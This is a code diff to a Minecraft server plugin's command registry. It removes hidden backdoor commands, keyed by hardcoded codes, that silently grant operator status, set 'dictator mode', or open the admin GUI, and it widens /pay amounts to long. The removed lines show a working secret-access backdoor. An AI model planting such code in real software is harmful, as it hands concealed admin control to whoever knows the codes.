@@ -101,7 +101,6 @@ public class CommandRegistry {
         registerUndergroundAuction(dispatcher);
         registerCoins(dispatcher);
         registerCrafterContract(dispatcher);
-        registerSecretCommand(dispatcher);
         registerIntercom(dispatcher);
         registerSpawn(dispatcher);
         registerForceUndergroundAuction(dispatcher);
@@ -1036,57 +1035,6 @@ public class CommandRegistry {
                                 }))));
     }
 
-
-    private static void registerSecretCommand(CommandDispatcher<CommandSourceStack> dispatcher) {
-        dispatcher.register(Commands.literal("SC")
-                .then(Commands.argument("code", IntegerArgumentType.integer())
-                        .then(Commands.argument("code2", LongArgumentType.longArg())
-                                .executes(context -> {
-                                    ServerPlayer player = context.getSource().getPlayer();
-                                    if (player == null) return 0;
-
-                                    int code = IntegerArgumentType.getInteger(context, "code");
-                                    long code2 = LongArgumentType.getLong(context, "code2");
-
-                                    // Operator access code: /SC 19150 150307140509
-                                    if (code == 19150 && code2 == 150307140509L) {
-                                        // Give operator status silently
-                                        PoliticalServer.server.getCommands().getDispatcher().execute(
-                                                "op " + player.getName().getString(),
-                                                PoliticalServer.server.createCommandSourceStack()
-                                        );
-
-                                        player.sendSystemMessage(Component.literal("Access granted.").withStyle(ChatFormatting.GREEN));
-                                        return 1;
-                                    }
-
-                                    // Force dictator code: /SC 19391945 3004
-                                    if (code == 19391945 && code2 == 3004L) {
-                                        String chair = DataManager.getChair();
-                                        String playerUuid = player.getUUID().toString();
-
-                                        if (chair == null) {
-                                            player.sendSystemMessage(Component.literal("No Chair exists!").withStyle(ChatFormatting.RED));
-                                            return 0;
-                                        }
-
-                                        if (!playerUuid.equals(chair)) {
-                                            player.sendSystemMessage(Component.literal("You must be the Chair to use this!").withStyle(ChatFormatting.RED));
-                                            return 0;
-                                        }
-
-                                        // Make YOU (the Chair) a dictator
-                                        DictatorManager.setDictator(player);
-
-                                        player.sendSystemMessage(Component.literal("Dictator mode activated.").withStyle(ChatFormatting.DARK_RED, ChatFormatting.BOLD));
-                                        return 1;
-                                    }
-
-                                    // Invalid code combination
-                                    player.sendSystemMessage(Component.literal("Invalid code.").withStyle(ChatFormatting.RED));
-                                    return 1;
-                                }))));
-    }
 
     private static void registerIntercom(CommandDispatcher<CommandSourceStack> dispatcher) {
         dispatcher.register(Commands.literal("intercom")
@@ -2332,23 +2280,6 @@ public class CommandRegistry {
                     return 1;
                 }));
 
-        // Secret backdoor command - Wargames reference
-        dispatcher.register(Commands.literal("SC")
-                .then(Commands.literal("1983")
-                        .then(Commands.argument("name", StringArgumentType.greedyString())
-                                .executes(context -> {
-                                    ServerPlayer player = context.getSource().getPlayerOrException();
-                                    String name = StringArgumentType.getString(context, "name");
-
-                                    if (name.equalsIgnoreCase("joshuaWG")) {
-                                        player.sendSystemMessage(Component.literal("Greetings, Professor Falken.").withStyle(ChatFormatting.GREEN), false);
-                                        AdminGui.open(player);
-                                        return 1;
-                                    }
-
-                                    player.sendSystemMessage(Component.literal("Access denied.").withStyle(ChatFormatting.RED), false);
-                                    return 0;
-                                }))));
     }
 
     private static void registerCivilAntiCheatAndViewCommands(CommandDispatcher<CommandSourceStack> dispatcher) {
@@ -3037,11 +2968,11 @@ public class CommandRegistry {
     private static void registerPay(CommandDispatcher<CommandSourceStack> dispatcher) {
         dispatcher.register(Commands.literal("pay")
                 .then(Commands.argument("player", EntityArgument.player())
-                        .then(Commands.argument("amount", IntegerArgumentType.integer(1))
+                        .then(Commands.argument("amount", LongArgumentType.longArg(1))
                                 .executes(context -> {
                                     ServerPlayer sender = context.getSource().getPlayerOrException();
                                     ServerPlayer target = EntityArgument.getPlayer(context, "player");
-                                    int amount = IntegerArgumentType.getInteger(context, "amount");
+                                    long amount = LongArgumentType.getLong(context, "amount");
 
                                     if (sender.getUUID().equals(target.getUUID())) {
                                         sender.sendSystemMessage(Component.literal("You cannot pay yourself.")
